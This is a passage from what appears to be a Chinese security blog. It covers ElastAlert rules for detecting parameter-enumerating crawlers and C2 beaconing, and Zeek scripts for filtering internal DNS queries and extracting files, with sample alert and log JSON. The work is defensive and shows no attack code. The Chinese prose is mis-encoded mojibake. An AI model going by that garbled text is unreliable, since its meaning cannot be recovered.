å”¯ä¸€UAä¸ªæ•°</span></span><br><span class="line"></span><br><span class="line"><span class="attr">field:</span></span><br><span class="line">  <span class="attr">true_client_ip:</span></span><br><span class="line">    <span class="attr">alias:</span> <span class="string">src_ip</span></span><br><span class="line">    <span class="attr">type:</span> [<span class="string">hash</span>]</span><br><span class="line">  <span class="attr">host:</span></span><br><span class="line">    <span class="attr">alias:</span> <span class="string">http_host</span></span><br><span class="line">    <span class="attr">type:</span> [<span class="string">hash</span>]</span><br><span class="line">  <span class="attr">uri_path:</span></span><br><span class="line">    <span class="attr">alias:</span> <span class="string">url_path</span></span><br><span class="line">    <span class="attr">type:</span> [<span class="string">hash</span>]</span><br><span class="line">  <span class="attr">uri:</span></span><br><span class="line">    <span class="attr">alias:</span> <span class="string">url</span></span><br><span class="line">  <span class="attr">user_agent:</span></span><br><span class="line">    <span class="attr">alias:</span> <span class="string">user_agent</span></span><br><span class="line"></span><br><span class="line"><span class="attr">output:</span></span><br><span class="line">  <span class="attr">json:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">yes</span>	<span class="comment"># æœ¬åœ°è¾“å‡º</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">/var/log/spider/spider_detect.json</span></span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">no</span>	<span class="comment"># è¾“å‡ºè‡³Redisï¼Œè”åŠ¨æƒ…æŠ¥æ•°æ®è¿›è¡Œç ”åˆ¤ã€‚</span></span><br><span class="line">    <span class="attr">host:</span> <span class="string">redis_server</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">6379</span></span><br><span class="line">    <span class="attr">db:</span> <span class="number">0</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">redis_password</span></span><br><span class="line">    <span class="attr">key:</span> <span class="string">spider:feeds</span></span><br><span class="line">    <span class="attr">field:</span> <span class="string">src_ip</span></span><br><span class="line"></span><br><span class="line"><span class="attr">alert:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">debug</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="å‘Šè­¦è¾“å‡º"><a href="#å‘Šè­¦è¾“å‡º" class="headerlink" title="å‘Šè­¦è¾“å‡º"></a>å‘Šè­¦è¾“å‡º</h5><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;detail&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;percent&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;cookieid&quot;</span>: <span class="number">81</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;unique&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;cookieid&quot;</span>: <span class="number">133</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;tags&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;enumerate&quot;</span>, <span class="comment">// å­˜åœ¨å‚æ•°éå†è¡Œä¸º</span></span><br><span class="line">    <span class="string">&quot;suspicious-ua&quot;</span>	<span class="comment">// user_agent è¶…è¿‡é˜ˆå€¼</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;src_ip&quot;</span>: <span class="string">&quot;54.160.169.250&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;url_path&quot;</span>: <span class="string">&quot;/image/cookieId.html&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;http_host&quot;</span>: <span class="string">&quot;canon88.github.io&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;unique_ua&quot;</span>: <span class="number">47</span>,</span><br><span class="line">  <span class="attr">&quot;alert&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">&quot;beacon&quot;</span>: &#123;&#125;,</span><br><span class="line">  <span class="attr">&quot;args_list&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;cookieid&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;total_hits&quot;</span>: <span class="number">164</span>,</span><br><span class="line">  <span class="attr">&quot;url_sample&quot;</span>: <span class="string">&quot;/image/cookieId.html?cookieid=E99A3E54-5A81-2907-1372-339FFB70A464&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;period&quot;</span>: <span class="string">&quot;1:00&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;timestamp&quot;</span>: <span class="string">&quot;2020-06-02T11:07:59.276581&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="ç®€è¿°"><a href="#ç®€è¿°" class="headerlink" title="ç®€è¿°"></a>ç®€è¿°</h5><p><strong>find_spiderï¼š <strong>ç”¨äºæ£€æµ‹å‚æ•°éå†çš„è¡Œä¸ºï¼Œè¿™é‡ŒåŠ ä¸Š</strong>find_beacon</strong>æ˜¯ä¸ºäº†å¢åŠ ä¸€ä¸ªå‘¨æœŸæ€§çš„æ£€æµ‹ç»´åº¦ã€‚å½“ç„¶å¾ˆå¤šçˆ¬è™«éƒ½ä¼šã€Œè‡ªå¸¦ã€æ—¶é—´æŠ–åŠ¨ï¼Œä»¥åŠä½¿ç”¨çˆ¬è™«æ± ï¼Œæ‰€ä»¥æ•ˆæœå¹¶ä¸æ˜¯ç‰¹åˆ«æ˜æ˜¾ã€‚</p>
<p><strong>find_beaconï¼š</strong>æ›´é€‚ç”¨äºæ£€æµ‹C2è¿æ¥ï¼Œä¾‹å¦‚é’ˆå¯¹DNSåŸŸåçš„è¯·æ±‚è¿™ç§æƒ…å†µï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªæ£€æµ‹åˆ°çš„åŸŸåå‘¨æœŸæ€§è¯·æ±‚çš„å‘Šè­¦ï¼š</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;src_ip&quot;</span>: <span class="string">&quot;x.x.x.228&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;hostname&quot;</span>: <span class="string">&quot;entitlement.service.imperva.com&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;answers&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;joxkwsf.x.incapdns.net&quot;</span>,</span><br><span class="line">        <span class="string">&quot;45.60.73.51&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;percent&quot;</span>: <span class="string">&quot;100&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;interval&quot;</span>: <span class="number">1800</span>,</span><br><span class="line">    <span class="attr">&quot;occurrences&quot;</span>: <span class="number">23</span>,</span><br><span class="line">    <span class="attr">&quot;timestamp&quot;</span>: <span class="string">&quot;2020-06-01T08:03:38.164363&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;period&quot;</span>: <span class="number">12</span>,</span><br><span class="line">    <span class="attr">&quot;event_type&quot;</span>: <span class="string">&quot;beaconing&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;num_hits&quot;</span>: <span class="number">806379</span>,</span><br><span class="line">    <span class="attr">&quot;num_matches&quot;</span>: <span class="number">3</span>,</span><br><span class="line">    <span class="attr">&quot;kibana_url&quot;</span>: <span class="string">&quot;https://canon88.github.io/goto/5f089bcc411426b854da71b9062fdc8c&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/2020/06/02/Elastalert-%E6%96%B0%E5%A2%9E%E5%91%A8%E6%9C%9F%E6%80%A7%E6%A3%80%E6%B5%8B%E8%A7%84%E5%88%99/%E5%91%A8%E6%9C%9F%E6%80%A7DNS%E8%AF%B7%E6%B1%82%E6%88%AA%E5%9B%BE-1.png" alt="image-20200603113849810"></p>
<h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>â€‹        1å°æ—¶å†…ï¼ŒIP: 54.160.169.250 æ€»å…±è®¿é—®äº†è¯¥æ¥å£164æ¬¡ä¸”cookieidå‚æ•°æ›´æ¢äº†133æ¬¡ï¼Œå åˆ°æ€»è¯·æ±‚é‡çš„81%ã€‚å¹¶æ›´æ¢äº†47ä¸ªä¸åŒçš„user_agentã€‚</p>
<p><img src="/2020/06/02/Elastalert-%E6%96%B0%E5%A2%9E%E5%91%A8%E6%9C%9F%E6%80%A7%E6%A3%80%E6%B5%8B%E8%A7%84%E5%88%99/%E5%BC%82%E5%B8%B8%E8%AE%BF%E9%97%AE%E6%88%AA%E5%9B%BE-1.png" alt="image-20200602114610615"></p>
<h4 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h4><p><strong><a target="_blank" rel="noopener" href="https://github.com/austin-taylor/flare">Flare</a></strong></p>
<p><strong><a target="_blank" rel="noopener" href="https://github.com/Yelp/elastalert">ElastAlert</a></strong></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/05/11/Zeek%E5%AE%9E%E6%88%98-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Canon">
      <meta itemprop="description" content="ä¸€ä¸ªçƒ­çˆ±å¥èº«çš„å®‰å…¨åˆ†æå¸ˆ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Canon's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2020/05/11/Zeek%E5%AE%9E%E6%88%98-1/" class="post-title-link" itemprop="url">Zeek - é«˜åº¦å®šåˆ¶åŒ–çš„ DNSäº‹ä»¶ + æ–‡ä»¶è¿˜åŸ</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">å‘è¡¨äº</span>

      <time title="åˆ›å»ºæ—¶é—´ï¼š2020-05-11 09:39:32" itemprop="dateCreated datePublished" datetime="2020-05-11T09:39:32+08:00">2020-05-11</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">æ›´æ–°äº</span>
        <time title="ä¿®æ”¹æ—¶é—´ï¼š2020-06-04 15:53:39" itemprop="dateModified" datetime="2020-06-04T15:53:39+08:00">2020-06-04</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">åˆ†ç±»äº</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/NIDS/" itemprop="url" rel="index"><span itemprop="name">NIDS</span></a>
        </span>
    </span>

  
      </div>
      <div class="post-meta">
    <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
      <span>11k</span>
    </span>
    <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
      <span>10 åˆ†é’Ÿ</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h4 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h4><ol>
<li><p>æœ¬åœ°ç¯å¢ƒä¸­éƒ¨ç½²äº†2å°NTAï¼ˆ<strong>Suricata</strong>ï¼‰æ¥æ”¶å†…ç½‘12å°DNSæœåŠ¡å™¨çš„æµé‡ï¼Œç”¨äºå‘ç°DNSè¯·æ±‚ä¸­å­˜åœ¨çš„å®‰å…¨é—®é¢˜ã€‚è¿‘ä¸€æ®µæ—¶é—´å‘ç°2å°NTAæœåŠ¡å™¨è¿è¡Œ10å°æ—¶å·¦å³å°±ä¼šè‡ªåŠ¨é‡å¯<strong>Suricata</strong>è¿›ç¨‹ï¼Œçœ‹äº†ä¸€ä¸‹æ—¥å¿—å¤§æ¦‚æ„æ€æ˜¯è¯´å†…å­˜ä¸è¶³ï¼Œéœ€è¦å¼ºåˆ¶é‡å¯é‡Šæ”¾å†…å­˜ã€‚è¯´èµ·è¿™ä¸ªé—®é¢˜å½“æ—¶ä¹Ÿæ˜¯èŠ±äº†ä¸€äº›æ—¶é—´å»å®šä½ã€‚é¦–å…ˆDNSè¿™ç§å°åŒ…åœ¨æˆ‘è¿™å¹³å‡æµé‡ä¹Ÿå°±25Mbpsï¼Œæ‰€ä»¥å¤§æ¦‚ç‡ä¸æ˜¯å› ä¸ºç½‘å¡æµé‡è¿‡å¤§è€Œå¯¼è‡´çš„ã€‚ç»§ç»­å®šä½ï¼Œç”±äºæˆ‘ä»¬è¿™å„ä¸ªåº”ç”¨æœåŠ¡å™¨ä¼šé€šè¿‡å†…ç½‘åŸŸåçš„å½¢å¼è¿›è¡Œæ¥å£è°ƒç”¨ï¼Œæ‰€ä»¥DNSè¯·æ±‚é‡å¾ˆå¤§ã€‚<strong>Kibana</strong>ä¸Šçœ‹äº†ä¸€ä¸‹ç›®å‰<code>dns_type: query</code>äº‹ä»¶çš„æ•°æ®é‡<strong>320,000,000/å¤© ~ 350,000,000/å¤©</strong>ï¼ˆè¿™ä»…ä»…æ˜¯<code>dns_type: query</code>æ•°æ®é‡ï¼Œ<code>dns_type: answer </code>æ•°æ®é‡<strong>ä¹Ÿè¶…çº§å¤§</strong>ï¼‰ã€‚ç”±äº<strong>Suricata</strong>ä¸èƒ½åœ¨æ•°æ®è¾“å‡ºä¹‹å‰å¯¹æŒ‡å®šåŸŸåè¿›è¡Œè¿‡æ»¤ï¼Œè¿™ä¸€ç‚¹ç¡®å®<strong>å¾ˆå‚»</strong>ï¼Œ<strong>å¿…é¡»åæ§½</strong>ã€‚å½“æ—¶çš„è§„é¿åšæ³•å°±æ˜¯åªä¿ç•™<code>dns_type: query</code>äº‹ä»¶ï¼Œæ—¢ä¿è¯äº†<strong>Suricata</strong>çš„æ­£å¸¸è¿è¡Œä¹Ÿæš‚æ—¶æ»¡è¶³äº†éœ€æ±‚ã€‚</p>
</li>
<li><p>è¿‘ä¸€æ®µæ—¶é—´ç½‘ç«™çš„æŸä¸ªä¸Šä¼ æ¥å£è¢«ä¸Šä¼ äº†åŒ…å«<strong>æ¶æ„Payload</strong>çš„jpgä¸pngã€‚è™½ç„¶<strong>Suricata</strong>æœ‰æ£€æµ‹åˆ°ï¼Œä½†ä¹Ÿå»¶ä¼¸äº†æ–°çš„éœ€æ±‚ï¼Œå¦‚ä½•åˆ¤æ–­æ–‡ä»¶æ˜¯å¦ä¸Šä¼ æˆåŠŸä»¥åŠæ–‡ä»¶è¿˜åŸä¸æå–<strong>HASH</strong>ã€‚è™½ç„¶è¿™ä¸¤ç‚¹<strong>Suricata</strong>è‡ªèº«éƒ½å¯ä»¥åšï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªå¼Šç«¯ä¸å¾—ä¸è¯´ã€‚ä¾‹å¦‚<strong>Suricata</strong>åªè¦å¼€å¯<code>file_info</code>å°±ä¼šå¯¹æ‰€æœ‰æ”¯æŒæ–‡ä»¶è¿˜åŸçš„åè®®è¿›è¡Œ<strong>HASH</strong>æå–ã€‚ç”±äºæˆ‘ä»¬æ˜¯ç”µå•†ï¼Œå¤–éƒ¨è®¿é—®çš„æ•°æ®é‡ä¼šå¾ˆå¤§ï¼Œ<strong>Suricata</strong>é»˜è®¤ä¸æ”¯æŒè¿‡æ»¤ï¼Œé’ˆå¯¹ç”¨æˆ·è®¿é—®çš„HTMLç½‘é¡µè¿™ç§ä¹Ÿä¼šè¢«è®¡ç®—ä¸€ä¸ª<strong>HASH</strong>ï¼Œè¿™ä¸ªé‡å°±éå¸¸çš„<strong>ææ€–</strong>äº†ã€‚</p>
</li>
</ol>
<p><strong>æ€»ç»“ï¼š</strong>é’ˆå¯¹ä»¥ä¸Š2ä¸ªé—®é¢˜ï¼Œæˆ‘éœ€è¦çš„æ˜¯ä¸€ä¸ªæ›´åŠ çµæ´»çš„NTAæ¡†æ¶ï¼Œä¸‹é¢è¯·æ¥æœ¬æ¬¡ä¸»è§’ - <strong>Zeek</strong>ã€‚</p>
<hr>
<h4 id="éœ€æ±‚"><a href="#éœ€æ±‚" class="headerlink" title="éœ€æ±‚"></a>éœ€æ±‚</h4><ol>
<li>è¿‡æ»¤å†…éƒ¨DNSåŸŸåï¼Œåªä¿ç•™å¤–éƒ¨DNSåŸŸåçš„è¯·æ±‚ä¸å“åº”æ•°æ®ï¼›</li>
<li>æ›´çµæ´»çš„æ–‡ä»¶è¿˜åŸä¸æå–HASH;</li>
</ol>
<hr>
<h4 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h4><h5 id="1-è¿‡æ»¤æœ¬åœ°DNSè¯·æ±‚"><a href="#1-è¿‡æ»¤æœ¬åœ°DNSè¯·æ±‚" class="headerlink" title="1. è¿‡æ»¤æœ¬åœ°DNSè¯·æ±‚"></a>1. è¿‡æ»¤æœ¬åœ°DNSè¯·æ±‚</h5><h6 id="DNSè„šæœ¬"><a href="#DNSè„šæœ¬" class="headerlink" title="DNSè„šæœ¬"></a>DNSè„šæœ¬</h6><p><strong>dns-filter_external.zeek</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">redef Site::local_zones = &#123;<span class="string">&quot;canon88.github.io&quot;</span>, <span class="string">&quot;baidu.com&quot;</span>, <span class="string">&quot;google.com&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> dns_filter(rec: DNS::Info): bool</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="built_in">return</span> ! Site::is_local_name(rec<span class="variable">$query</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">redef Analyzer::disable_all = T</span><br><span class="line"></span><br><span class="line">event <span class="function"><span class="title">zeek_init</span></span>()</span><br><span class="line">  &#123;</span><br><span class="line">  Analyzer::enable_analyzer(Analyzer::ANALYZER_VXLAN);</span><br><span class="line">  Analyzer::enable_analyzer(Analyzer::ANALYZER_DNS);</span><br><span class="line">  Log::remove_default_filter(DNS::LOG);</span><br><span class="line">  <span class="built_in">local</span> filter: Log::Filter = [<span class="variable">$name</span>=<span class="string">&quot;dns_split&quot;</span>, <span class="variable">$path</span>=<span class="string">&quot;/data/logs/zeek/dns_remotezone&quot;</span>, <span class="variable">$pred</span>=dns_filter];</span><br><span class="line">  Log::add_filter(DNS::LOG, filter);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h6 id="è„šæœ¬ç®€è¿°ï¼š"><a href="#è„šæœ¬ç®€è¿°ï¼š" class="headerlink" title="è„šæœ¬ç®€è¿°ï¼š"></a>è„šæœ¬ç®€è¿°ï¼š</h6><ol>
<li><p>é€šè¿‡<code>Site::local_zones</code>å®šä¹‰ä¸€ä¸ªå†…éƒ¨çš„åŸŸåï¼Œè¿™äº›åŸŸåé»˜è®¤éƒ½æ˜¯æˆ‘ä»¬éœ€è¦è¿‡æ»¤æ‰çš„ã€‚ä¾‹å¦‚ï¼Œåœ¨æˆ‘çš„éœ€æ±‚ä¸­ï¼Œå¤šä¸ºå†…ç½‘çš„åŸŸåï¼›</p>
<ol start="2">
<li>ä¼˜åŒ–æ€§èƒ½ï¼Œ åªå¼€å¯DNSæµé‡è§£æã€‚ç”±äºè¿™2å°NTAåªè´Ÿè´£è§£æDNSæµé‡ï¼Œä¸ºäº†ä¿ç•™é’ˆå¯¹åŸŸåç‰¹å¾æ£€æµ‹çš„èƒ½åŠ›ï¼Œæˆ‘é€‰æ‹©äº†<strong>Suricata</strong>ä¸<strong>Zeek</strong>å…±å­˜ï¼Œå½“ç„¶<strong>Zeek</strong>ä¹Ÿå¯ä»¥åšç‰¹å¾æ£€æµ‹ï¼Œåªæ˜¯æˆ‘æ‡’ã€‚ã€‚ã€‚é€šè¿‡<code>Analyzer::enable_analyzer(Analyzer::ANALYZER_DNS);</code>æŒ‡å®šäº†åªå¯¹DNSæµé‡è¿›è¡Œåˆ†æï¼›</li>
<li>è¿‡æ»¤æ—¥å¿—å¹¶è¾“å‡ºï¼›</li>
</ol>
</li>
</ol>
<h6 id="æ—¥å¿—æ ·ä¾‹ï¼š"><a href="#æ—¥å¿—æ ·ä¾‹ï¼š" class="headerlink" title="æ—¥å¿—æ ·ä¾‹ï¼š"></a>æ—¥å¿—æ ·ä¾‹ï¼š</h6><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;ts&quot;</span>: <span class="number">1589175829.994196</span>,</span><br><span class="line">  <span class="attr">&quot;uid&quot;</span>: <span class="string">&quot;CPRxOZ2RtkPYhjz8R9&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;id.orig_h&quot;</span>: <span class="string">&quot;1.1.1.1&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;id.orig_p&quot;</span>: <span class="number">40411</span>,</span><br><span class="line">  <span class="attr">&quot;id.resp_h&quot;</span>: <span class="string">&quot;2.2.2.2&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;id.resp_p&quot;</span>: <span class="number">53</span>,</span><br><span class="line">  <span class="attr">&quot;proto&quot;</span>: <span class="string">&quot;udp&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;trans_id&quot;</span>: <span class="number">696</span>,</span><br><span class="line">  <span class="attr">&quot;rtt&quot;</span>: <span class="number">1.3113021850585938e-05</span>,</span><br><span class="line">  <span class="attr">&quot;query&quot;</span>: <span class="string">&quot;graph.facebook.com&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;qclass&quot;</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">&quot;qclass_name&quot;</span>: <span class="string">&quot;C_INTERNET&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;qtype&quot;</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">&quot;qtype_name&quot;</span>: <span class="string">&quot;A&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;rcode&quot;</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">&quot;rcode_name&quot;</span>: <span class="string">&quot;NOERROR&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;AA&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">&quot;TC&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">&quot;RD&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">&quot;RA&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">&quot;Z&quot;</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">&quot;answers&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;api.facebook.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;star.c10r.facebook.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;157.240.22.19&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;TTLs&quot;</span>: [</span><br><span class="line">    <span class="number">540</span>,</span><br><span class="line">    <span class="number">770</span>,</span><br><span class="line">    <span class="number">54</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;rejected&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">&quot;event_type&quot;</span>: <span class="string">&quot;dns&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h6><p>å½“é‡‡ç”¨Zeekè¿‡æ»¤äº†DNSè¯·æ±‚åï¼Œç°åœ¨æ¯å¤©çš„DNSæ•°æ®é‡ <strong>6,300,000/å¤© ~ 6,800,000/å¤©</strong>ï¼ˆquery + answerï¼‰ï¼Œå¯¹æ¯”ä¹‹å‰çš„æ•°æ®é‡<strong>320,000,000/å¤© ~ 350,000,000/å¤©</strong>ï¼ˆqueryï¼‰ã€‚æ•°æ®é‡å‡å°‘å¾ˆæ˜æ˜¾ï¼ŒåŒæ—¶ä¹Ÿå‡å°‘äº†åç«¯ESå­˜å‚¨çš„å‹åŠ›ã€‚</p>
<ul>
<li>Zeek DNS ï¼ˆquery + answerï¼‰</li>
</ul>
<p><img src="/2020/05/11/Zeek%E5%AE%9E%E6%88%98-1/Zeek-DNS-1.png" alt="image-20200511135508651"></p>
<ul>
<li>Suricata DNS ï¼ˆqueryï¼‰</li>
</ul>
<p><img src="/2020/05/11/Zeek%E5%AE%9E%E6%88%98-1/Suricata-DNS-1.png" alt="image-20200511140015791"></p>
<hr>
<h5 id="2-æ›´çµæ´»çš„æ–‡ä»¶è¿˜åŸä¸æå–æ–‡ä»¶HASH"><a href="#2-æ›´çµæ´»çš„æ–‡ä»¶è¿˜åŸä¸æå–æ–‡ä»¶HASH" class="headerlink" title="2. æ›´çµæ´»çš„æ–‡ä»¶è¿˜åŸä¸æå–æ–‡ä»¶HASH"></a>2. æ›´çµæ´»çš„æ–‡ä»¶è¿˜åŸä¸æå–æ–‡ä»¶HASH</h5><h6 id="æ–‡ä»¶è¿˜åŸè„šæœ¬"><a href="#æ–‡ä»¶è¿˜åŸè„šæœ¬" class="headerlink" title="æ–‡ä»¶è¿˜åŸè„šæœ¬"></a>æ–‡ä»¶è¿˜åŸè„šæœ¬</h6><p><strong>file_extraction.zeek</strong> </p>
<p><strong>Demoè„šæœ¬ï¼Œè¯­æ³•å¹¶ä¸æ˜¯å¾ˆä¼˜é›…ï¼Œåˆ‡å‹¿çº ç»“ã€‚</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span 